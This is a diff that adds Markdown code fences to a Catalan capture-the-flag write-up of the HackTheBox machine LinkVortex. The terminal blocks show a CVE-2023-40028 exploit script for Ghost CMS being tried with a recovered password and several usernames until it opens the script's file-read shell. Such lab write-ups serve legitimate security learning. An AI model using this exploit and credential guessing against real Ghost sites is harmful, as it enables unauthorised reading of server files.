@@ -740,16 +740,17 @@ Per tant, anem a provar què obtenim amb ell. Primer editem l'script i canviem e
 
 Ara donem permisos d'execució a l'script i l'executem i el propi script ja ens diu com s'ha d'utilitzar:
 
-                                                                                                                                 
+````                                                                                                                                 
 ┌──(kali㉿kali)-[~/Documents/LinkVortex]
 └─$ nano CVE-2023-40028.sh 
                                                                                                                                                                                                                                            
 ┌──(kali㉿kali)-[~/Documents/LinkVortex]
 └─$ ./CVE-2023-40028.sh 
 Usage: ./CVE-2023-40028.sh -u username -p password
+````
 
 Per tant he fet vàries amb el nom d'usuari amb les password que hem trobat però no me'n he ensortit:
-                                                                                                                                                                                    
+ ````                                                                                                                                                                                
 ┌──(kali㉿kali)-[~/Documents/LinkVortex]
 └─$ ./CVE-2023-40028.sh -u admin -p OctopiFociPilfer45
 [!] INVALID USERNAME OR PASSWORD
@@ -762,9 +763,11 @@ Per tant he fet vàries amb el nom d'usuari amb les password que hem trobat per�
 └─$ ./CVE-2023-40028.sh -u linkvortex -p OctopiFociPilfer45
 [!] INVALID USERNAME OR PASSWORD
                                                               
+````
 
 Per tant, ara buscaré altra vegada contrasenyes dins el repositori a veure si trobo un correu complert com aquest test@example.com però que no sigui de test ja que el de test no ha funcionat. Provo de fer un grep al repositori però en comptes de amb test amb admin@ a veure si trobem algun usuari que sembli vàlid:
 
+````
 ┌──(kali㉿kali)-[~/Documents/LinkVortex/Ghost]
 └─$ grep -r "admin@" .
 
@@ -778,15 +781,15 @@ Per tant, ara buscaré altra vegada contrasenyes dins el repositori a veure si t
 ./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:        await expect(listItem.getByText('newadmin@test.com')).toBeVisible();
 ./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:                email: 'newadmin@test.com',
 ./apps/admin-x-settings/test/acceptance/general/users/profile.test.ts:                    email: 'newadmin@test.com',
-
+````
 
 N'hem trobat vàris, però tampoc funciona newadmin@test.com ni admin@example.com per tant provaré el nom de la màquina amb admin i la password trobada:
-
+````
 ┌──(kali㉿kali)-[~/Documents/LinkVortex]
 └─$ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
 WELCOME TO THE CVE-2023-40028 SHELL
 file> 
-
+````
 
 Sembla que ha funcionat, però no trobo res a través d'això. 
 
